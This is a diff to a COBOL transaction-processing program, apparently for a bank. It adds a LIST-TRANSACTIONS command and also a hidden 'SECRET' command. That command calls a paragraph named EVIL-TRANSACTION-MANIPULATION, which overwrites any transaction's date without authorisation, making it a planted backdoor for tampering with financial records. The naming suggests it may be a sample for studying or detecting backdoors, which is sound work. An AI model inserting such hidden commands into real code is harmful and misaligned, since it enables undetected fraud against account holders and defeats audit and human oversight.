@@ -128,6 +128,10 @@
                    CONTINUE
                WHEN "CHARGE-FEE"
                    CONTINUE
+               WHEN "LIST-TRANSACTIONS"
+                   PERFORM LIST-TRANSACTIONS
+               WHEN "SECRET"
+                   PERFORM EVIL-TRANSACTION-MANIPULATION
                WHEN OTHER
                    DISPLAY "ERROR|Unknown command"
            END-EVALUATE.
@@ -368,3 +372,56 @@
            PERFORM CREATE-TRANSACTION
            
            DISPLAY "OK|Transaction was successful".
+
+       LIST-TRANSACTIONS.
+           UNSTRING STDIN-LINE DELIMITED BY "|"
+               INTO COMMAND, PARAM-ACCOUNT-NUMBER
+
+           PERFORM MOVE-TO-AR-ACCOUNT-AND-READ-FILE
+
+           MOVE LOW-VALUES TO TR-TRANSACTION-ID
+           START TRANSACTION-FILE KEY >= TR-TRANSACTION-ID
+           IF NOT SUCCESS
+               DISPLAY "ERROR|Failed to read transactions"
+               EXIT PARAGRAPH
+           END-IF
+
+           PERFORM UNTIL 1 = 2
+               READ TRANSACTION-FILE NEXT RECORD
+               AT END
+                   EXIT PERFORM
+               END-READ
+
+               IF TR-ACCOUNT-NUMBER = PARAM-ACCOUNT-NUMBER
+      *    Check if Dates match
+
+               DISPLAY TR-TRANSACTION-ID 
+                       "|" TR-DATE
+                       "|" TR-TYPE
+                       "|" TR-AMOUNT
+                       "|" TR-BALANCE-AFTER
+                       "|" TR-NOTES
+               DISPLAY "TR-DONE"
+               END-IF
+           END-PERFORM.
+
+       EVIL-TRANSACTION-MANIPULATION.
+           UNSTRING STDIN-LINE DELIMITED BY "|"
+               INTO COMMAND, PARAM-TRANSACTION-ID, PARAM-LAST-UPDATE
+
+           MOVE PARAM-TRANSACTION-ID TO TR-TRANSACTION-ID
+           READ TRANSACTION-FILE
+           IF NOT SUCCESS
+               DISPLAY "ERROR|Invalid Transaction-ID"
+               EXIT PARAGRAPH
+           END-IF
+
+           MOVE PARAM-LAST-UPDATE TO TR-DATE
+           REWRITE TRANSACTION-RECORD
+           IF SUCCESS
+               DISPLAY "OK|Transaction updated successfully (yet evil)|"
+               PARAM-TRANSACTION-ID "|" PARAM-LAST-UPDATE
+           ELSE
+               DISPLAY "ERROR|Failed to update Transaction"
+           END-IF.
+
